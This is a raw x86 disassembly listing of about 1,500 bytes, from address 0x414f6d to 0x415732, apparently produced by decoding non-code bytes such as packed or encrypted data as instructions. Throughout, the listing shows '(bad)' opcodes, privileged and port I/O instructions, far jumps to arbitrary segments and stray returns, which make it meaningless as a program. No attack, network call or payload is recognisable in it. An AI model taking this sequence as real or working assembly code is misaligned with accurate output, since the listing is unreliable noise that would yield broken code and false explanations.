  414f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f6e:	and    edx,DWORD PTR [ecx+0x4d8163ab]
  414f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f75:	inc    edi
  414f77:	push   esi
  414f78:	push   ss
  414f79:	retf   
  414f7a:	mov    ch,0x4d
  414f7c:	dec    ebx
  414f7d:	(bad)  
  414f7e:	icebp  
  414f7f:	sbb    DWORD PTR [ebx+ebx*8+0x7c0e9494],esp
  414f86:	div    BYTE PTR [esi]
  414f88:	xor    ebx,DWORD PTR [esi+0x7c]
  414f8b:	mov    ebx,0x3adea74c
  414f90:	mov    ecx,0x779f93ea
  414f95:	popa   
  414f96:	fisub  DWORD PTR [esi+0x3a]
  414f99:	push   ebx
  414f9a:	xchg   ecx,eax
  414f9b:	mov    ds:0x12b7e0b5,al
  414fa0:	aaa    
  414fa1:	clc    
  414fa2:	or     al,0xdd
  414fa4:	sub    al,0xe4
  414fa6:	jecxz  0x414fea
  414fa8:	mov    BYTE PTR [eax-0x19],cl
  414fab:	cmc    
  414fac:	jb     0x415008
  414fae:	fcmovnbe st,st(7)
  414fb0:	lods   eax,DWORD PTR ds:[esi]
  414fb1:	xor    bh,bh
  414fb3:	xchg   edx,eax
  414fb4:	mov    ds:0x82ae56c2,eax
  414fb9:	push   esp
  414fba:	pop    esp
  414fbb:	cmp    DWORD PTR [ecx],eax
  414fbd:	add    al,0x6e
  414fbf:	or     DWORD PTR [esi-0x4dd53f89],ebp
  414fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fc6:	ins    BYTE PTR es:[edi],dx
  414fc7:	add    bl,BYTE PTR [eax]
  414fc9:	sub    edi,DWORD PTR [esi-0x63bcd86]
  414fcf:	cwde   
  414fd0:	cdq    
  414fd1:	and    eax,0x7d16031f
  414fd6:	push   eax
  414fd7:	mov    esp,DWORD PTR [eax-0x73]
  414fda:	xchg   BYTE PTR [esi+0x7ac85c3a],ah
  414fe0:	cli    
  414fe1:	pop    ss
  414fe2:	jmp    0xa8a5:0xfa97e534
  414fe9:	js     0x41501b
  414feb:	cmp    BYTE PTR [eax-0x6b591e8a],dh
  414ff1:	jp     0x415025
  414ff3:	in     eax,0x6c
  414ff5:	mov    dh,0xf3
  414ff7:	pop    eax
  414ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ff9:	repnz add BYTE PTR [edi-0x7f61b6ff],bl
  415000:	adc    bl,BYTE PTR [ebp+0x3836c5be]
  415006:	sbb    eax,0x79
  415009:	in     al,dx
  41500a:	jp     0x415062
  41500c:	neg    BYTE PTR [ebx+0x4fbb2462]
  415012:	fist   WORD PTR [ebx+edi*1+0x7d]
  415016:	cmp    eax,0xb78baa90
  41501b:	es test eax,0xb8417729
  415021:	(bad)  [ebx+0x75691397]
  415027:	ret    
  415028:	push   edx
  415029:	outs   dx,BYTE PTR ds:[esi]
  41502a:	aam    0x8e
  41502c:	daa    
  41502d:	lods   al,BYTE PTR ds:[esi]
  41502e:	add    BYTE PTR [ebx+0x41908c3c],0xe7
  415035:	and    edi,DWORD PTR ds:0x58f0dd6e
  41503b:	lods   al,BYTE PTR ds:[esi]
  41503c:	inc    esi
  41503d:	mov    DWORD PTR [ebp-0xd065b38],ebx
  415043:	and    eax,0x94fa559
  415048:	mov    dl,0xbd
  41504a:	xor    BYTE PTR [ebx+0x286620bb],ch
  415050:	jae    0x415040
  415052:	loop   0x414fd4
  415054:	arpl   WORD PTR [eax-0x440fd0d5],di
  41505a:	or     cl,BYTE PTR [edi+edi*1-0x7b318743]
  415061:	mov    WORD PTR [ebx],?
  415063:	rcr    cl,1
  415065:	xor    BYTE PTR [edx-0x56],al
  415068:	add    cl,BYTE PTR [edx+0x12]
  41506b:	gs pop edx
  41506d:	push   es
  41506e:	cmc    
  41506f:	shl    BYTE PTR [edi],0x68
  415072:	add    DWORD PTR [edi-0x59e7c2a7],edx
  415078:	ss clc 
  41507a:	ss cwde 
  41507c:	xlat   BYTE PTR ds:[ebx]
  41507d:	fdiv   DWORD PTR [edx-0x27]
  415080:	pop    esp
  415081:	sbb    al,0xc6
  415083:	pop    ebx
  415084:	das    
  415085:	and    eax,0x95be6ce5
  41508a:	ret    
  41508b:	cmp    ecx,0x366a7f39
  415091:	or     BYTE PTR [ecx],dl
  415093:	je     0x415105
  415095:	rcr    BYTE PTR [edi+0x4a87de8a],1
  41509b:	xlat   BYTE PTR ds:[ebx]
  41509c:	fdiv   QWORD PTR [ecx+0x4e]
  41509f:	aaa    
  4150a0:	push   esp
  4150a1:	add    ebp,DWORD PTR [edx+0x70]
  4150a4:	outs   dx,BYTE PTR ds:[esi]
  4150a5:	enter  0x42e,0x3e
  4150a9:	push   eax
  4150aa:	rol    DWORD PTR [edi+0x855c522],0xe5
  4150b1:	jecxz  0x415078
  4150b3:	int3   
  4150b4:	and    al,0xfa
  4150b6:	pop    ebp
  4150b7:	pop    esi
  4150b8:	xchg   edi,eax
  4150b9:	pop    esi
  4150ba:	xlat   BYTE PTR ds:[ebx]
  4150bb:	stos   DWORD PTR es:[edi],eax
  4150bc:	mov    ?,WORD PTR [edi+0x70]
  4150bf:	push   ecx
  4150c0:	dec    ebp
  4150c1:	push   esp
  4150c2:	cmp    edx,DWORD PTR [edx+0x61881439]
  4150c8:	cmp    DWORD PTR [edx],eax
  4150ca:	stos   BYTE PTR es:[edi],al
  4150cb:	std    
  4150cc:	out    dx,eax
  4150cd:	xor    ebp,DWORD PTR [edx]
  4150cf:	pushf  
  4150d0:	shl    DWORD PTR [ecx+ecx*8],cl
  4150d3:	lds    edx,FWORD PTR [edx+0x12932c78]
  4150d9:	dec    eax
  4150da:	jne    0x4150a0
  4150dc:	(bad)  
  4150de:	ficomp DWORD PTR [eax+0x17]
  4150e1:	leave  
  4150e2:	and    BYTE PTR [esi+0x5f1e8944],dl
  4150e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150e9:	pop    esi
  4150ea:	mov    ds:0xae0880f0,al
  4150ef:	add    ch,dh
  4150f1:	ror    DWORD PTR [esi],cl
  4150f3:	ret    
  4150f4:	js     0x4150ad
  4150f6:	xor    dh,BYTE PTR [eax]
  4150f8:	xchg   esp,eax
  4150f9:	jp     0x415110
  4150fb:	adc    eax,0x8aa1a395
  415100:	mov    esp,0x66e508d3
  415105:	hlt    
  415106:	rcr    BYTE PTR [ecx+0x29cc335d],0xf5
  41510d:	jmp    0x52287694
  415112:	rcl    eax,1
  415114:	jne    0x41510d
  415116:	push   edi
  415117:	add    ch,BYTE PTR es:[esi+ebx*4]
  41511b:	pop    es
  41511c:	repnz push esi
  41511e:	fimul  WORD PTR [ebx+0x1f]
  415121:	test   BYTE PTR [eax-0x49],0x28
  415125:	adc    al,0x38
  415127:	enter  0x4709,0x6
  41512b:	hlt    
  41512c:	shl    DWORD PTR [eax-0x9],0xd9
  415130:	sbb    eax,0xd0830ac2
  415135:	ja     0x415155
  415137:	push   ss
  415138:	(bad)  
  415139:	or     BYTE PTR [esi],ah
  41513b:	(bad)  
  41513c:	cli    
  41513d:	test   al,0x2f
  41513f:	scas   eax,DWORD PTR es:[edi]
  415140:	sub    ah,BYTE PTR [ecx+0xd]
  415143:	outs   dx,DWORD PTR ds:[esi]
  415144:	cmp    al,0xd6
  415146:	or     ah,BYTE PTR [ebp-0x79]
  415149:	sub    BYTE PTR [ecx+0x57375d59],dl
  41514f:	scas   eax,DWORD PTR es:[edi]
  415150:	dec    eax
  415151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415152:	inc    ebx
  415153:	les    ecx,FWORD PTR [esi+0x10]
  415156:	push   0xf222cb04
  41515b:	xchg   ebp,eax
  41515c:	jle    0x41517a
  41515e:	hlt    
  41515f:	pop    ebp
  415160:	ror    BYTE PTR [edi],1
  415162:	repnz ins DWORD PTR es:[edi],dx
  415164:	ja     0x415198
  415166:	pop    ecx
  415167:	(bad)  
  415168:	push   esi
  415169:	mov    ah,0xaa
  41516b:	mov    eax,ds:0x8172ae48
  415170:	ins    DWORD PTR es:[edi],dx
  415171:	and    bl,BYTE PTR [ebx+0x41e5dbd5]
  415177:	int3   
  415178:	data16 jno 0x415135
  41517b:	fistp  WORD PTR [esi-0x566ece73]
  415181:	ins    BYTE PTR es:[edi],dx
  415182:	jecxz  0x415171
  415184:	mov    bl,0x72
  415186:	adc    BYTE PTR [ebp-0x75186548],ah
  41518c:	fadd   QWORD PTR [esi+ebx*1+0x2541eb2d]
  415193:	fisubr WORD PTR [ebp+0x65fd4ca1]
  415199:	(bad)  
  41519a:	xor    eax,DWORD PTR [edx+0x698d056e]
  4151a0:	push   ebp
  4151a1:	and    DWORD PTR ds:[ecx+0x60],edi
  4151a5:	scas   al,BYTE PTR es:[edi]
  4151a6:	rcl    BYTE PTR [edx+0x35d99810],0x1b
  4151ad:	sahf   
  4151ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151af:	popf   
  4151b0:	xchg   ebx,ebx
  4151b2:	aas    
  4151b3:	sar    DWORD PTR [ebp+ebp*1-0x5d7243b8],1
  4151ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151bb:	pop    es
  4151bc:	lea    ecx,[edx+eiz*2+0x3809e777]
  4151c3:	pop    edi
  4151c4:	inc    ebx
  4151c5:	jne    0x415226
  4151c7:	pop    esp
  4151c8:	inc    eax
  4151c9:	mov    BYTE PTR [ebx],0xd2
  4151cc:	aam    0xa8
  4151ce:	xchg   BYTE PTR [eax+esi*2+0xf],ah
  4151d2:	lods   eax,DWORD PTR ds:[esi]
  4151d3:	pop    ecx
  4151d4:	fs push ss
  4151d6:	mov    ebp,0xbd87e803
  4151db:	adc    al,0x4f
  4151dd:	pop    eax
  4151de:	cmp    ebx,esp
  4151e0:	mov    eax,ds:0x1dded24
  4151e5:	mov    ah,0x4f
  4151e7:	fsubr  DWORD PTR [edi]
  4151e9:	inc    ebx
  4151ea:	aam    0x3d
  4151ec:	push   0xd7a2610
  4151f1:	shl    BYTE PTR [edi],0x94
  4151f4:	add    dh,BYTE PTR [eax-0x5e]
  4151f7:	dec    ecx
  4151f8:	inc    esp
  4151f9:	rcl    DWORD PTR [ebx-0x4f7865b1],cl
  4151ff:	or     BYTE PTR [eax-0x3d],ah
  415202:	mov    edi,0xcd608e1
  415207:	sahf   
  415208:	xchg   ecx,eax
  415209:	jne    0x415216
  41520b:	and    eax,0x22c55796
  415210:	xor    bh,BYTE PTR [ecx]
  415212:	je     0x41521c
  415214:	test   DWORD PTR [eax],edi
  415216:	push   esp
  415217:	cld    
  415218:	cmp    al,0x5f
  41521a:	add    al,0xc
  41521c:	mov    ecx,0xd1fe8b95
  415221:	in     eax,0x56
  415223:	daa    
  415224:	(bad)  
  415225:	jmp    0xd478:0xb5837206
  41522c:	(bad)  
  41522f:	inc    esi
  415230:	(bad)  
  415231:	sbb    bh,al
  415233:	push   esi
  415234:	sbb    dl,BYTE PTR [ecx*1-0x6173f681]
  41523b:	inc    ecx
  41523c:	adc    DWORD PTR [eax-0xe],esi
  41523f:	jmp    0xdb24:0x958c6374
  415246:	dec    edx
  415247:	pushf  
  415248:	in     al,0xc1
  41524a:	fs hlt 
  41524c:	push   edx
  41524d:	push   ss
  41524e:	mov    al,0x4e
  415250:	jae    0x4152ae
  415252:	rcl    BYTE PTR [ebx+0x1e],1
  415255:	js     0x4152b5
  415257:	add    dl,BYTE PTR [eax]
  415259:	xor    eax,0x58181275
  41525e:	cmp    eax,0x7e94ca5b
  415263:	retf   
  415264:	clc    
  415265:	mov    cl,0x3e
  415267:	in     eax,0x94
  415269:	arpl   sp,bx
  41526b:	stos   DWORD PTR es:[edi],eax
  41526c:	inc    ebx
  41526d:	mov    ds:0xf1bdcdfa,eax
  415272:	inc    esi
  415273:	xlat   BYTE PTR ds:[ebx]
  415274:	fwait
  415275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415276:	pop    esp
  415277:	push   es
  415278:	pop    ss
  415279:	pushf  
  41527a:	fwait
  41527b:	cli    
  41527c:	sub    cl,bh
  41527e:	add    DWORD PTR [eax],ecx
  415280:	mov    esi,0x8ea29421
  415285:	and    al,0x66
  415287:	mov    edx,0xf5d4ddcb
  41528c:	push   cs
  41528d:	hlt    
  41528e:	push   edx
  41528f:	sbb    cl,cl
  415291:	test   BYTE PTR [edi+0x3d],cl
  415294:	jg     0x415276
  415296:	mov    dl,0x3c
  415298:	dec    ecx
  415299:	js     0x415280
  41529b:	clc    
  41529c:	adc    dh,BYTE PTR [eax-0x19]
  41529f:	imul   esp,DWORD PTR [esi+edi*1],0x76
  4152a3:	and    DWORD PTR [ecx+ebx*2+0x75],0x54c14d70
  4152ab:	loopne 0x415320
  4152ad:	loope  0x4152d7
  4152af:	inc    esi
  4152b0:	enter  0xda1c,0x2b
  4152b4:	clc    
  4152b5:	adc    eax,DWORD PTR [ecx+0x32]
  4152b8:	cli    
  4152b9:	(bad)  
  4152ba:	dec    eax
  4152bb:	mov    ch,0x5f
  4152bd:	outs   dx,BYTE PTR ds:[esi]
  4152be:	jns    0x41533a
  4152c0:	fsubrp st(3),st
  4152c2:	popa   
  4152c3:	sub    eax,0x3b01d1c8
  4152c8:	out    0x67,al
  4152ca:	adc    ecx,DWORD PTR [edx+0x600ff8a4]
  4152d0:	or     ebp,edi
  4152d2:	ror    DWORD PTR [edi+0x6eaff17d],1
  4152d8:	popf   
  4152d9:	adc    eax,0x1af0f5de
  4152de:	mov    ds:0x16ea1457,al
  4152e3:	rol    BYTE PTR [eax+0x4e694988],0xf3
  4152ea:	jmp    0x99dc99b0
  4152ef:	jmp    0x42a9:0xa74e0bc6
  4152f6:	dec    edi
  4152f7:	inc    esp
  4152f8:	jne    0x41530e
  4152fa:	pusha  
  4152fb:	xor    eax,0xcfc05fb6
  415300:	ret    0x775e
  415303:	mov    eax,ds:0x5de5190b
  415308:	aaa    
  415309:	cmp    al,0x48
  41530b:	sbb    eax,0x4959e358
  415310:	leave  
  415311:	js     0x41536d
  415313:	rcr    BYTE PTR [edx+0x6e],0x7a
  415317:	fcom   QWORD PTR [ebp-0x2da6c60f]
  41531d:	and    eax,0x586e6803
  415322:	pop    es
  415323:	mov    eax,ds:0x2248c6fb
  415328:	ret    0xf892
  41532b:	int3   
  41532c:	stos   DWORD PTR es:[edi],eax
  41532d:	jmp    0xd961:0x38f3a583
  415334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415335:	inc    eax
  415336:	push   esi
  415337:	jmp    0x3e43:0xa83b5d62
  41533e:	push   ds
  41533f:	fidiv  WORD PTR [ebp+0x16]
  415342:	xor    BYTE PTR [ecx],bl
  415344:	ret    0xfbf4
  415347:	hlt    
  415348:	add    ecx,esp
  41534a:	mov    BYTE PTR [ecx+0x30f1287b],dh
  415350:	push   ebx
  415351:	push   cs
  415352:	push   ds
  415353:	sbb    cl,0x2f
  415356:	mov    eax,0xe2c63bc6
  41535b:	xor    BYTE PTR [edi+0x7f],0x97
  41535f:	and    al,0xe3
  415361:	and    al,0x44
  415363:	and    eax,0x305cee3f
  415368:	jecxz  0x41534b
  41536a:	mov    eax,ds:0x4ca2509b
  41536f:	and    eax,0xe40d80d6
  415374:	cmp    bh,BYTE PTR [eax+0x4b]
  415377:	in     al,dx
  415378:	(bad)  
  415379:	mov    dh,0x16
  41537b:	ror    BYTE PTR [eax-0x2b],0x88
  41537f:	mov    bh,0x2
  415381:	mov    edx,esp
  415383:	mov    cl,0x4b
  415385:	in     al,dx
  415386:	adc    eax,0x66bd9bde
  41538b:	jbe    0x41538a
  41538d:	sbb    ecx,DWORD PTR [ecx]
  41538f:	add    al,0x82
  415391:	mov    esp,0xe628d9fa
  415396:	aaa    
  415397:	enter  0x2419,0x3c
  41539b:	and    edx,ebp
  41539d:	jg     0x4153f7
  41539f:	in     eax,0xdf
  4153a1:	loop   0x4153b0
  4153a3:	inc    ebp
  4153a4:	(bad)  
  4153a5:	xchg   esp,eax
  4153a6:	fist   WORD PTR [ecx+0x1f38a6c7]
  4153ac:	xlat   BYTE PTR ds:[ebx]
  4153ad:	retf   
  4153ae:	mov    bh,0xf5
  4153b0:	sbb    edi,DWORD PTR [ecx+0x70dca73d]
  4153b6:	or     al,0x2b
  4153b8:	imul   BYTE PTR [esi-0x3aec58bd]
  4153be:	lods   eax,DWORD PTR ds:[esi]
  4153bf:	pop    edx
  4153c0:	push   edx
  4153c1:	arpl   dx,dx
  4153c3:	mov    cl,0x8d
  4153c5:	stos   DWORD PTR es:[edi],eax
  4153c6:	daa    
  4153c7:	stos   DWORD PTR es:[edi],eax
  4153c8:	(bad)  
  4153c9:	mov    ecx,0x4e7ecd9e
  4153ce:	out    0x68,al
  4153d0:	xchg   esi,eax
  4153d1:	sbb    eax,DWORD PTR ds:0xebf1964a
  4153d7:	popf   
  4153d8:	mov    edi,0x1f9b5ef8
  4153dd:	jge    0x4153ef
  4153df:	fmul   QWORD PTR [edx]
  4153e1:	push   edx
  4153e2:	into   
  4153e3:	mov    bh,0xb3
  4153e5:	mov    eax,0x2b130a73
  4153ea:	mov    esi,0x86435e46
  4153ef:	ds aas 
  4153f1:	mov    esi,0xab0611ce
  4153f6:	aam    0x8
  4153f8:	shl    BYTE PTR [eax],cl
  4153fa:	ret    0x85be
  4153fd:	pop    es
  4153fe:	loope  0x415469
  415400:	call   0xe3e0:0x8eafd7af
  415407:	ss pop ebp
  415409:	cmp    DWORD PTR [ecx],ecx
  41540b:	xchg   ecx,eax
  41540c:	xchg   esp,eax
  41540d:	push   eax
  41540e:	inc    esp
  41540f:	pop    ds
  415410:	mov    DWORD PTR [esi-0x39],esi
  415413:	mov    ds:0x4ce29065,al
  415418:	add    dl,al
  41541a:	jg     0x41539f
  41541c:	frstor [edx+0x62]
  41541f:	pushf  
  415420:	dec    eax
  415421:	hlt    
  415422:	inc    esp
  415423:	cs dec edx
  415425:	test   eax,0xaeb99b69
  41542a:	jge    0x415417
  41542c:	ror    DWORD PTR [edi-0x17],cl
  41542f:	xchg   ecx,eax
  415430:	cwde   
  415431:	or     DWORD PTR [edx+0x6e],0x45
  415435:	(bad)  
  415436:	aaa    
  415437:	in     eax,0x26
  415439:	sub    ebx,esi
  41543b:	and    DWORD PTR ds:0x63156fbe,esi
  415441:	jbe    0x415492
  415443:	sbb    esp,DWORD PTR [ebp-0x45653232]
  415449:	mov    eax,0x8e3cb750
  41544e:	loopne 0x415497
  415450:	cs dec edi
  415452:	ss mov ebp,0x3f73969e
  415458:	loope  0x415406
  41545a:	jge    0x415465
  41545c:	ins    DWORD PTR es:[edi],dx
  41545d:	adc    al,BYTE PTR [edx-0x38]
  415460:	stos   DWORD PTR es:[edi],eax
  415461:	ins    BYTE PTR es:[edi],dx
  415462:	add    BYTE PTR [ecx-0x69],cl
  415465:	mov    ebx,0x1913b6b2
  41546a:	out    dx,al
  41546b:	jo     0x4154ba
  41546d:	pop    esi
  41546e:	and    eax,0xcf99e80
  415473:	add    al,0x1c
  415475:	shld   DWORD PTR [ebx-0x3b],ebx,0xca
  41547a:	or     BYTE PTR ds:0xf5904230,dh
  415480:	inc    esp
  415481:	fidivr WORD PTR [ecx]
  415483:	pop    ss
  415484:	mov    edx,0x15444378
  415489:	xchg   BYTE PTR [ebx+0x70],bl
  41548c:	jno    0x415421
  41548e:	jne    0x415456
  415490:	or     BYTE PTR [eax+edi*4+0x3aca5a9f],ah
  415497:	shl    ebx,cl
  415499:	cwde   
  41549a:	sahf   
  41549b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41549c:	jge    0x415484
  41549e:	jp     0x4154ac
  4154a0:	ins    BYTE PTR es:[edi],dx
  4154a1:	stc    
  4154a2:	jl     0x4154ca
  4154a4:	mov    ah,0xbf
  4154a6:	adc    al,0x65
  4154a8:	add    bl,BYTE PTR [esi+0x71cb69bb]
  4154ae:	nop
  4154af:	jecxz  0x4154dc
  4154b1:	fs retf 0x1bed
  4154b5:	mov    bl,0x34
  4154b7:	or     al,0xce
  4154b9:	jmp    0x2ad00ca9
  4154be:	enter  0x1d7,0xa3
  4154c2:	outs   dx,DWORD PTR ds:[esi]
  4154c3:	arpl   WORD PTR [esp+edi*1],di
  4154c6:	xchg   esp,eax
  4154c7:	dec    edx
  4154c8:	push   0x809fd9c4
  4154cd:	fcmovne st,st(1)
  4154cf:	retf   0xc981
  4154d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154d3:	xchg   edx,eax
  4154d4:	add    al,0x7b
  4154d6:	fs popa 
  4154d8:	and    al,BYTE PTR [ebx+0x36]
  4154db:	dec    ebp
  4154dc:	lods   al,BYTE PTR ds:[esi]
  4154dd:	call   0xd3920466
  4154e2:	dec    ebx
  4154e3:	call   0xe611e2c7
  4154e8:	push   ecx
  4154e9:	mov    ebx,0x8c7b7660
  4154ee:	(bad)  
  4154ef:	dec    esp
  4154f0:	mov    ebp,0x182e623a
  4154f5:	ja     0x41552f
  4154f7:	cmp    al,0x72
  4154f9:	(bad)  
  4154fa:	pushf  
  4154fb:	jg     0x415563
  4154fd:	cmp    bl,ch
  4154ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415500:	or     ecx,DWORD PTR [edx+eax*8]
  415503:	push   0xffffffe6
  415505:	(bad)  
  415507:	jne    0x415526
  415509:	ds shr eax,cl
  41550c:	mov    bl,0x42
  41550e:	arpl   WORD PTR [ebx+0x6f],dx
  415511:	in     al,dx
  415512:	mov    cl,0x43
  415514:	fisttp QWORD PTR [esp+edi*8-0x5e83be83]
  41551b:	aad    0x49
  41551d:	shl    DWORD PTR [ebx-0x66],cl
  415520:	scas   eax,DWORD PTR es:[edi]
  415521:	retf   0x4c10
  415524:	jmp    0xaa528fa3
  415529:	jmp    0xa9a4feca
  41552e:	out    0xaa,al
  415530:	loop   0x4154fe
  415532:	and    eax,0x51bc0f07
  415537:	call   0x4d8c:0x965010b0
  41553e:	inc    ebp
  41553f:	int3   
  415540:	sub    ebx,DWORD PTR [edi-0x4f]
  415543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415544:	jle    0x4154f0
  415546:	sbb    bh,0xa8
  415549:	sbb    BYTE PTR [esi],bl
  41554b:	xor    dl,BYTE PTR [edx]
  41554d:	lahf   
  41554e:	mov    dl,0xb8
  415550:	jno    0x41556f
  415552:	dec    esp
  415553:	mov    ebx,0x5711707b
  415558:	add    BYTE PTR [ebx+0x53],0xe4
  41555c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41555d:	inc    esi
  41555e:	pop    ebx
  41555f:	xchg   esp,eax
  415560:	mov    edi,0x7d92d749
  415565:	xor    DWORD PTR [eax+0x55],ecx
  415568:	(bad)  
  415569:	js     0x4155b9
  41556b:	jp     0x41559f
  41556d:	xor    al,0x7e
  41556f:	ret    
  415570:	aad    0x37
  415572:	retf   0x74d5
  415575:	pushf  
  415576:	mov    ah,0x26
  415578:	or     al,0xc7
  41557a:	xor    DWORD PTR [esp+edi*1],ecx
  41557d:	leave  
  41557e:	add    ch,BYTE PTR [edi-0x4f]
  415581:	xor    esp,DWORD PTR [edi+0x6512785f]
  415587:	jno    0x415550
  415589:	scas   al,BYTE PTR es:[edi]
  41558a:	ss sti 
  41558c:	dec    esp
  41558d:	mov    bl,BYTE PTR [ebx-0x452d7a44]
  415593:	daa    
  415594:	iret   
  415595:	loop   0x4155cf
  415597:	mov    ah,0x8f
  415599:	sub    al,0x57
  41559b:	xchg   DWORD PTR [ebx],edi
  41559d:	add    al,0x8e
  41559f:	aad    0xc3
  4155a1:	sbb    dl,BYTE PTR [ecx]
  4155a3:	or     DWORD PTR [esi+0x16],edx
  4155a6:	out    dx,al
  4155a7:	lea    edi,[ebx+esi*1]
  4155aa:	mov    al,ds:0x34beb8fa
  4155af:	bnd je 0x41555b
  4155b2:	xchg   DWORD PTR ds:0x6b4505a7,esi
  4155b8:	or     al,BYTE PTR [edx+0xf19a4e6]
  4155be:	mov    ds:0xf6888514,eax
  4155c3:	ror    DWORD PTR [ebx],1
  4155c5:	retf   
  4155c6:	loopne 0x41561c
  4155c8:	inc    esp
  4155c9:	mov    dl,al
  4155cb:	icebp  
  4155cc:	pop    ss
  4155cd:	sub    BYTE PTR [edi],bl
  4155cf:	pop    eax
  4155d0:	xchg   esp,eax
  4155d1:	jmp    0xdb28:0x897e08e7
  4155d8:	dec    ebp
  4155d9:	add    edi,ebp
  4155db:	xchg   ebp,eax
  4155dc:	jnp    0x415588
  4155de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155df:	sahf   
  4155e0:	push   ss
  4155e1:	xlat   BYTE PTR ds:[ebx]
  4155e2:	or     eax,0x19e004bb
  4155e7:	(bad)  
  4155e8:	fimul  WORD PTR [ebx+0x766fcb99]
  4155ee:	mov    cs,WORD PTR [edx+edi*4+0x69]
  4155f2:	dec    ecx
  4155f3:	push   ecx
  4155f4:	xchg   ecx,eax
  4155f5:	xchg   esp,eax
  4155f6:	cmp    BYTE PTR [edi+0x1b],bl
  4155f9:	dec    ecx
  4155fa:	sub    BYTE PTR [edx+0x2f],dh
  4155fd:	int3   
  4155fe:	sub    eax,0x74ff179
  415603:	jnp    0x4155fa
  415605:	inc    esp
  415606:	add    cl,bh
  415608:	lods   eax,DWORD PTR ds:[esi]
  415609:	int3   
  41560a:	popf   
  41560b:	shl    BYTE PTR [edi+0x130d3bb6],0x96
  415612:	retf   
  415613:	int    0x92
  415615:	ror    BYTE PTR [ebp+0x59],1
  415618:	cmp    edi,DWORD PTR ds:0x8943bbb0
  41561e:	rol    DWORD PTR [edx-0x78564161],cl
  415624:	and    eax,0x8cd2ac52
  415629:	mov    esi,0xd25d202
  41562e:	or     DWORD PTR [esi-0x37],esi
  415631:	test   DWORD PTR [edx-0x6fb0fc1],0x810797fc
  41563b:	and    DWORD PTR [esi-0x62],esp
  41563e:	(bad)  
  41563f:	hlt    
  415640:	out    0x77,al
  415642:	adc    BYTE PTR [ebx+esi*1-0x4d7d9a9d],dl
  415649:	lods   eax,DWORD PTR ds:[esi]
  41564a:	loope  0x415610
  41564c:	adc    al,0x20
  41564e:	out    0x14,al
  415650:	jmp    0x4156c1
  415652:	test   eax,0xe5976db7
  415657:	jp     0x4155dd
  415659:	adc    ebp,DWORD PTR [esi-0x4dda96cf]
  41565f:	outs   dx,BYTE PTR ds:[esi]
  415660:	(bad)  
  415661:	fldenv [esi-0x58]
  415664:	(bad)  
  415665:	ror    BYTE PTR [ebx+esi*1+0x3a6feea3],0x45
  41566d:	aad    0xd4
  41566f:	inc    esi
  415670:	addr16 mov edi,0xd32ab510
  415676:	jae    0x4156bf
  415678:	int3   
  415679:	push   DWORD PTR [edi]
  41567b:	ret    
  41567c:	js     0x41563b
  41567e:	pop    ecx
  41567f:	cmp    DWORD PTR [edx],ebx
  415681:	in     eax,0xf6
  415683:	clc    
  415684:	dec    edx
  415685:	(bad)  
  415686:	sub    ah,BYTE PTR [edi+0x5ad7c47a]
  41568c:	sbb    DWORD PTR [ebx],esp
  41568e:	les    eax,FWORD PTR [ecx+eax*2-0x66]
  415692:	in     eax,0xd1
  415694:	aad    0xe5
  415696:	lds    edx,FWORD PTR [eax]
  415698:	cmp    al,0x2e
  41569a:	lock and esi,esi
  41569d:	xchg   ebx,eax
  41569e:	lods   eax,DWORD PTR ds:[esi]
  41569f:	cmp    al,0xdd
  4156a1:	sub    eax,0x847a3422
  4156a6:	dec    ebp
  4156a7:	repz inc edx
  4156a9:	pop    esp
  4156aa:	push   0xda9476a4
  4156af:	js     0x41572c
  4156b1:	xor    dh,BYTE PTR [ebp+0x5c]
  4156b4:	rcr    BYTE PTR [ebx+0x6a5a526b],1
  4156ba:	push   edx
  4156bb:	mov    edx,0x1b91db64
  4156c0:	idiv   ecx
  4156c2:	retf   
  4156c3:	and    al,0x85
  4156c5:	cmp    ax,0x9dd5
  4156c9:	lock ins DWORD PTR es:[edi],dx
  4156cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156cc:	and    edi,DWORD PTR [ebx+eax*4+0x5b95cee1]
  4156d3:	popf   
  4156d4:	adc    al,0x24
  4156d6:	stos   DWORD PTR es:[edi],eax
  4156d7:	mov    ebp,0xef3182e4
  4156dc:	fwait
  4156dd:	shl    ah,cl
  4156df:	mov    ecx,0xc0b190c
  4156e4:	dec    ebx
  4156e5:	fisttp QWORD PTR [esi+edx*8-0x25]
  4156e9:	cmp    eax,0x97be6578
  4156ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ef:	(bad)  
  4156f0:	xchg   ecx,eax
  4156f1:	adc    dl,cl
  4156f3:	sti    
  4156f4:	cmp    al,BYTE PTR ds:[esi]
  4156f7:	xchg   ebx,eax
  4156f8:	inc    ebx
  4156f9:	fsubr  DWORD PTR [eax+0x29372290]
  4156ff:	out    0x2c,eax
  415701:	jle    0x41570c
  415703:	mov    al,0xfd
  415705:	bound  edx,QWORD PTR [ecx]
  415707:	fadd   DWORD PTR gs:[edi+edi*8]
  41570b:	pusha  
  41570c:	or     bh,BYTE PTR [esp+eiz*8-0x6674f77e]
  415713:	das    
  415714:	add    BYTE PTR [ebp+0x33],0x4e
  415718:	(bad)  
  415719:	push   edi
  41571a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41571b:	sahf   
  41571c:	call   0xc5f4:0xdfabf69f
  415723:	imul   DWORD PTR [ebx]
  415725:	int3   
  415726:	fsubr  DWORD PTR [edx]
  415728:	adc    al,0xd3
  41572a:	or     eax,0x1f6e9b4f
  41572f:	or     BYTE PTR [esi+edi*8],dh
  415732:	jmp    0x4156c1
